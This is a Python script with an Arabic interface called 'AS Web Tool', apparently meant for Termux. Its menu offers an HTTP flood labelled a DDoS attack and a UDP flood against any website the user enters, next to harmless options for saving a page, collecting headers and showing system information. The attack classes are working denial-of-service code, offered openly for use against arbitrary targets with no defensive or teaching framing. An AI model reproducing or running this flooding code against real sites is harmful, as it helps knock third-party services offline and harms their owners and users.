#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AS Web Tool - أداة AS المتكاملة للويب
الإصدار 2.1 - بدون Pillow (متوافق مع Termux)
"""

import os
import sys
import time
import requests
import httpx
import urllib3
import urllib.request as urllib
import cloudscraper
import aiohttp
import asyncio
import random
import threading
import socket
import platform
import psutil
import re
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
from random import choice
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import urllib.parse

# ========== نظام الألوان الموحد ==========
class Colors:
    RED = '\033[1;31m'
    PINK = '\033[1;35m'
    DARK_RED = '\033[2;31m'
    YELLOW = '\033[1;33m'
    GREEN = '\033[2;32m'
    BLUE = '\033[2;34m'
    PURPLE = '\033[2;35m'
    ORANGE = '\033[38;5;208m'
    LIGHT_BLUE = '\033[1;34m'
    WHITE = '\033[1;37m'
    CYAN = '\033[1;36m'
    RESET = '\033[0m'

C = Colors()

# ========== الدوال المساعدة ==========
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_requirements():
    required_libraries = ['requests', 'httpx', 'cloudscraper', 'aiohttp', 'bs4', 'psutil']
    
    missing = []
    for lib in required_libraries:
        try:
            if lib == 'bs4':
                import bs4
            else:
                __import__(lib)
        except ImportError:
            missing.append(lib)
    
    if missing:
        print(f"{C.RED}[!]{C.WHITE} المكتبات المفقودة: {', '.join(missing)}")
        print(f"{C.YELLOW}[?]{C.WHITE} جاري التثبيت...")
        try:
            import subprocess
            for lib in missing:
                if lib == 'bs4':
                    lib = 'beautifulsoup4'
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
            print(f"{C.GREEN}[✓]{C.WHITE} تم التثبيت!")
            return True
        except Exception as e:
            print(f"{C.RED}[!]{C.WHITE} فشل في التثبيت: {e}")
            return False
    return True

def is_termux():
    return 'com.termux' in os.environ.get('PREFIX', '')

def get_storage_path():
    if is_termux():
        base_path = "/storage/emulated/0/AS_Web_Tool/"
    else:
        base_path = "AS_Web_Tool/"
    os.makedirs(base_path, exist_ok=True)
    return base_path

# ========== البانر والقوائم ==========
def main_banner():
    banner = f"""
{C.PURPLE}╔══════════════════════════════════════════════════════════════╗
{C.PURPLE}║{C.CYAN}         █████╗ ███████╗     ███████╗███████╗██████╗      {C.PURPLE}║
{C.PURPLE}║{C.CYAN}        ██╔══██╗██╔════╝     ██╔════╝██╔════╝██╔══██╗     {C.PURPLE}║
{C.PURPLE}║{C.CYAN}        ███████║███████╗     ███████╗█████╗  ██████╔╝     {C.PURPLE}║
{C.PURPLE}║{C.CYAN}        ██╔══██║╚════██║     ╚════██║██╔══╝  ██╔══██╗     {C.PURPLE}║
{C.PURPLE}║{C.CYAN}        ██║  ██║███████║     ███████║███████╗██║  ██║     {C.PURPLE}║
{C.PURPLE}║{C.CYAN}        ╚═╝  ╚═╝╚══════╝     ╚══════╝╚══════╝╚═╝  ╚═╝     {C.PURPLE}║
{C.PURPLE}║{C.YELLOW}              AS Web Tool - الإصدار 2.1              {C.PURPLE}║
{C.PURPLE}║{C.WHITE}             بدون Pillow - خفيف وسريع               {C.PURPLE}║
{C.PURPLE}╚══════════════════════════════════════════════════════════════╝{C.RESET}
"""
    print(banner)

def show_menu():
    menu = f"""
{C.GREEN}╔══════════════════════════════════════════════════════════════╗
{C.GREEN}║{C.WHITE}                        القائمة الرئيسية                        {C.GREEN}║
{C.GREEN}╠══════════════════════════════════════════════════════════════╣
{C.GREEN}║ {C.CYAN}[1]{C.WHITE} هجوم DDoS على الموقع                               {C.GREEN}║
{C.GREEN}║ {C.CYAN}[2]{C.WHITE} هجوم UDP على الموقع                                {C.GREEN}║
{C.GREEN}║ {C.CYAN}[3]{C.WHITE} سحب موقع كامل                                     {C.GREEN}║
{C.GREEN}║ {C.CYAN}[4]{C.WHITE} أخذ لقطة للموقع (بدون صور)                       {C.GREEN}║
{C.GREEN}║ {C.CYAN}[5]{C.WHITE} معلومات النظام                                    {C.GREEN}║
{C.GREEN}║ {C.CYAN}[0]{C.WHITE} خروج                                               {C.GREEN}║
{C.GREEN}╚══════════════════════════════════════════════════════════════╝{C.RESET}
"""
    print(menu)

# ========== الأداة 1: هجوم DDoS ==========
class DDoSAttack:
    def __init__(self):
        self.good = self.gg = self.bb = 0
        self.url = ""
        self.num = 100

    def generate_headers(self):
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        headers = {'User-Agent': user_agent}
        return headers

    def print_stats(self):
        clear_screen()
        main_banner()
        stats = f"""
{C.YELLOW}╔══════════════════════════════════════════════════════════════╗
{C.YELLOW}║{C.WHITE}                     إحصائيات الهجوم                        {C.YELLOW}║
{C.YELLOW}╠══════════════════════════════════════════════════════════════╣
{C.YELLOW}║ {C.GREEN}[✓]{C.WHITE} هجمات ناجحة: {self.good:<20} 「{self.good}」 {C.YELLOW}║
{C.YELLOW}║ {C.ORANGE}[~]{C.WHITE} هجمات محتملة: {self.gg:<19} 「{self.gg}」 {C.YELLOW}║
{C.YELLOW}║ {C.RED}[✗]{C.WHITE} هجمات فاشلة: {self.bb:<20} 「{self.bb}」 {C.YELLOW}║
{C.YELLOW}║ {C.CYAN}[⚡]{C.WHITE} الهدف: {self.url:<30} {C.YELLOW}║
{C.YELLOW}╚══════════════════════════════════════════════════════════════╝{C.RESET}
"""
        print(stats)

    def send_requests(self):
        headers = self.generate_headers()
        try:
            response = requests.get(self.url, headers=headers, timeout=5)
            if response.status_code == 200:
                self.good += 1
            elif response.status_code >= 500:
                self.gg += 1
            else:
                self.bb += 1
        except:
            self.bb += 1
        self.print_stats()

    def start_attack(self):
        clear_screen()
        main_banner()
        print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.CYAN}║{C.WHITE}                    إعدادات هجوم DDoS                     {C.CYAN}║")
        print(f"{C.CYAN}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        self.url = input(f"{C.YELLOW}[?]{C.WHITE} أدخل رابط الموقع: {C.GREEN}").strip()
        if not self.url:
            self.url = "http://example.com"
        
        try:
            num_input = input(f"{C.YELLOW}[?]{C.WHITE} عدد الثريدات (افتراضي 100): {C.GREEN}").strip()
            self.num = int(num_input) if num_input else 100
        except:
            self.num = 100
        
        print(f"{C.RED}[!]{C.WHITE} بدء الهجوم... {C.CYAN}Ctrl+C{C.WHITE} للإيقاف")
        
        def attack_worker():
            while True:
                try:
                    self.send_requests()
                    time.sleep(0.1)
                except:
                    pass

        threads = []
        for _ in range(min(self.num, 50)):
            thread = Thread(target=attack_worker, daemon=True)
            threads.append(thread)
            thread.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f'\n{C.GREEN}[✓]{C.WHITE} تم إيقاف الهجوم')

# ========== الأداة 2: هجوم UDP ==========
class UDPAttack:
    def create_rnd_msg(self, msg_size):
        return ''.join(chr(random.randint(0, 255)) for _ in range(msg_size))

    def start_attack(self):
        clear_screen()
        main_banner()
        print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.CYAN}║{C.WHITE}                    إعدادات هجوم UDP                      {C.CYAN}║")
        print(f"{C.CYAN}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        site = input(f"{C.YELLOW}[?]{C.WHITE} أدخل رابط الموقع: {C.GREEN}")
        if 'https://' in site:
            site = site.split('https://')[1]
        if '/' in site:
            site = site.split('/')[0]
        
        try:
            thread_count = int(input(f"{C.YELLOW}[?]{C.WHITE} عدد الثريدات: {C.GREEN}"))
        except:
            thread_count = 20
        
        UDP_PORT = 80
        
        try:
            ip = socket.gethostbyname(site)
        except:
            print(f"{C.RED}[!]{C.WHITE} لا يمكن حل اسم النطاق")
            return
        
        print(f"\n{C.YELLOW}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.YELLOW}║{C.WHITE}                     معلومات الهجوم                       {C.YELLOW}║")
        print(f"{C.YELLOW}╠══════════════════════════════════════════════════════════════╣")
        print(f"{C.YELLOW}║ {C.CYAN}↳{C.WHITE} البروتوكول: {C.GREEN}UDP{C.WHITE}                          {C.YELLOW}║")
        print(f"{C.YELLOW}║ {C.CYAN}↳{C.WHITE} IP الهدف: {C.GREEN}{ip}{C.WHITE}             {C.YELLOW}║")
        print(f"{C.YELLOW}║ {C.CYAN}↳{C.WHITE} البورت: {C.GREEN}{UDP_PORT}{C.WHITE}                              {C.YELLOW}║")
        print(f"{C.YELLOW}║ {C.CYAN}↳{C.WHITE} الثريدات: {C.GREEN}{thread_count}{C.WHITE}                             {C.YELLOW}║")
        print(f"{C.YELLOW}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        print(f"{C.RED}[!]{C.WHITE} بدء الهجوم... {C.CYAN}Ctrl+C{C.WHITE} للإيقاف")
        
        def udp_dos():
            try:
                msg = str.encode(self.create_rnd_msg(8))
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(msg, (ip, UDP_PORT))
                print(f"{C.GREEN}\r[✓] تم الإرسال {C.RESET}", end='')
            except:
                pass
        
        try:
            for i in range(min(thread_count, 30)):
                thread = threading.Thread(target=udp_dos)
                thread.daemon = True
                thread.start()
            
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{C.GREEN}[✓]{C.WHITE} تم إيقاف الهجوم")

# ========== الأداة 3: سحب موقع ==========
class WebsiteDownloader:
    def download_website(self):
        clear_screen()
        main_banner()
        print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.CYAN}║{C.WHITE}                    سحب موقع كامل                         {C.CYAN}║")
        print(f"{C.CYAN}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        base_url = input(f"{C.YELLOW}[?]{C.WHITE} أدخل رابط الموقع: {C.GREEN}").strip()
        if not base_url.startswith(('http://', 'https://')):
            base_url = 'https://' + base_url
        
        download_folder = os.path.join(get_storage_path(), "Downloaded_Sites")
        os.makedirs(download_folder, exist_ok=True)
        
        print(f"{C.GREEN}[✓]{C.WHITE} جاري سحب الموقع...")
        
        try:
            response = requests.get(base_url, timeout=10)
            if response.status_code == 200:
                domain = urlparse(base_url).netloc
                main_file = os.path.join(download_folder, f"{domain}_index.html")
                
                with open(main_file, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                
                print(f"{C.GREEN}[✓]{C.WHITE} تم حفظ الصفحة الرئيسية: {main_file}")
                
                # حفظ معلومات إضافية
                info_file = os.path.join(download_folder, f"{domain}_info.txt")
                with open(info_file, 'w', encoding='utf-8') as f:
                    f.write(f"الموقع: {base_url}\n")
                    f.write(f"الوقت: {time.ctime()}\n")
                    f.write(f"الحجم: {len(response.text)} بايت\n")
                
                print(f"{C.GREEN}[✓]{C.WHITE} تم حفظ معلومات الموقع")
                
            else:
                print(f"{C.RED}[!]{C.WHITE} فشل في الوصول للموقع: {response.status_code}")
                
        except Exception as e:
            print(f"{C.RED}[!]{C.WHITE} خطأ: {e}")
        
        print(f"\n{C.GREEN}[✓]{C.WHITE} اكتمل سحب الموقع")

# ========== الأداة 4: أخذ لقطة للموقع (بدون صور) ==========
class ScreenshotTaker:
    def take_screenshot(self):
        clear_screen()
        main_banner()
        print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.CYAN}║{C.WHITE}              أخذ لقطة معلومات الموقع (بدون صور)          {C.CYAN}║")
        print(f"{C.CYAN}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        try:
            website_url = input(f"{C.YELLOW}[?]{C.WHITE} أدخل رابط الموقع: {C.GREEN}").strip()
            if not website_url.startswith(('http://', 'https://')):
                website_url = 'https://' + website_url
            
            storage_path = get_storage_path()
            screenshots_folder = os.path.join(storage_path, "Site_Info")
            os.makedirs(screenshots_folder, exist_ok=True)
            
            print(f"{C.GREEN}[✓]{C.WHITE} جاري جمع معلومات الموقع...")
            
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            domain = urlparse(website_url).netloc.replace('.', '_')
            
            # جمع معلومات الموقع
            info_file = self.collect_site_info(website_url, screenshots_folder, domain, timestamp)
            
            if info_file:
                print(f"{C.GREEN}[✓]{C.WHITE} تم حفظ معلومات الموقع: {C.YELLOW}{info_file}")
            else:
                print(f"{C.RED}[!]{C.WHITE} فشل في جمع المعلومات")
                
        except Exception as e:
            print(f"{C.RED}[!]{C.WHITE} خطأ: {e}")

    def collect_site_info(self, url, folder, domain, timestamp):
        try:
            info_file = os.path.join(folder, f"site_info_{domain}_{timestamp}.txt")
            
            with open(info_file, 'w', encoding='utf-8') as f:
                f.write("="*60 + "\n")
                f.write("          AS Web Tool - معلومات الموقع\n")
                f.write("="*60 + "\n")
                f.write(f"الرابط: {url}\n")
                f.write(f"وقت الجمع: {time.ctime()}\n")
                f.write("-"*60 + "\n")
                
                try:
                    # معلومات DNS
                    ip = socket.gethostbyname(urlparse(url).netloc)
                    f.write(f"عنوان IP: {ip}\n")
                except:
                    f.write("عنوان IP: غير متاح\n")
                
                try:
                    # معلومات الاستجابة
                    response = requests.get(url, timeout=10)
                    f.write(f"رمز الاستجابة: {response.status_code}\n")
                    f.write(f"نوع المحتوى: {response.headers.get('content-type', 'غير معروف')}\n")
                    f.write(f"حجم الصفحة: {len(response.text)} بايت\n")
                    
                    # معلومات إضافية من الheaders
                    f.write("-"*60 + "\n")
                    f.write("معلومات الرأس (Headers):\n")
                    for key, value in response.headers.items():
                        f.write(f"  {key}: {value}\n")
                        
                except Exception as e:
                    f.write(f"خطأ في الاتصال: {e}\n")
            
            return info_file
            
        except Exception as e:
            print(f"{C.YELLOW}[!]{C.WHITE} فشل في حفظ المعلومات: {e}")
            return None

# ========== الأداة 5: معلومات النظام ==========
class SystemInfo:
    def show_info(self):
        clear_screen()
        main_banner()
        print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.CYAN}║{C.WHITE}                    معلومات النظام                         {C.CYAN}║")
        print(f"{C.CYAN}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        try:
            print(f"{C.GREEN}[✓]{C.WHITE} النظام: {C.CYAN}{platform.system()} {platform.release()}")
            print(f"{C.GREEN}[✓]{C.WHITE} اسم الجهاز: {C.CYAN}{socket.gethostname()}")
            
            cpu_usage = psutil.cpu_percent(interval=1)
            print(f"{C.GREEN}[✓]{C.WHITE} استخدام المعالج: {C.CYAN}{cpu_usage}%")
            
            memory = psutil.virtual_memory()
            print(f"{C.GREEN}[✓]{C.WHITE} استخدام الذاكرة: {C.CYAN}{memory.percent}%")
            
            disk = psutil.disk_usage('/')
            print(f"{C.GREEN}[✓]{C.WHITE} استخدام التخزين: {C.CYAN}{disk.percent}%")
            
            if is_termux():
                print(f"\n{C.GREEN}[✓]{C.WHITE} البيئة: {C.CYAN}Termux")
                storage_path = get_storage_path()
                print(f"{C.GREEN}[✓]{C.WHITE} مسار التخزين: {C.CYAN}{storage_path}")
                
        except Exception as e:
            print(f"{C.RED}[!]{C.WHITE} خطأ في جمع المعلومات: {e}")

# ========== الوظيفة الرئيسية ==========
def main():
    if not check_requirements():
        print(f"{C.RED}[!]{C.WHITE} فشل في تثبيت المتطلبات")
        return
    
    ddos = DDoSAttack()
    udp = UDPAttack()
    downloader = WebsiteDownloader()
    screenshot = ScreenshotTaker()
    system_info = SystemInfo()
    
    while True:
        clear_screen()
        main_banner()
        show_menu()
        
        choice = input(f"\n{C.YELLOW}[?]{C.WHITE} اختر الخيار [0-5]: {C.GREEN}").strip()
        
        if choice == '1':
            ddos.start_attack()
        elif choice == '2':
            udp.start_attack()
        elif choice == '3':
            downloader.download_website()
        elif choice == '4':
            screenshot.take_screenshot()
        elif choice == '5':
            system_info.show_info()
        elif choice == '0':
            print(f"\n{C.GREEN}[✓]{C.WHITE} شكراً لاستخدامك أداة AS!")
            break
        else:
            print(f"{C.RED}[!]{C.WHITE} خيار غير صحيح")
        
        input(f"\n{C.YELLOW}[?]{C.WHITE} اضغط Enter للمتابعة...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.GREEN}[✓]{C.WHITE} تم الخروج")
    except Exception as e:
        print(f"{C.RED}[!]{C.WHITE} خطأ: {e}")
